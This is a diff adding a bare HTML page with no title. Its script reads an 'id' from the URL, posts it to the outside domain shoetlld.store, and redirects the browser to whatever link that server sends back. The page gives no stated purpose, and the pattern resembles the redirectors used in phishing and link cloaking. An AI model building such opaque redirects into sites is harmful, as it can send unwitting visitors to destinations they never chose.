@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title></title>
+  </head>
+  <body>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.3.3/axios.min.js"></script>
+    <script>
+      const queryString = window.location.search;
+      const urlParam = new URLSearchParams(queryString);
+      const value = urlParam.get("id");
+      console.log("value", value);
+
+      axios
+        .post("https://shoetlld.store/findusers", { id: value })
+        .then((res) => {
+          console.log("hello");
+          if (res.data.link[0].link) {
+            console.log(res.data.link[0].link);
+            window.location = res.data.link[0].link;
+          }
+        });
+    </script>
+  </body>
+</html>
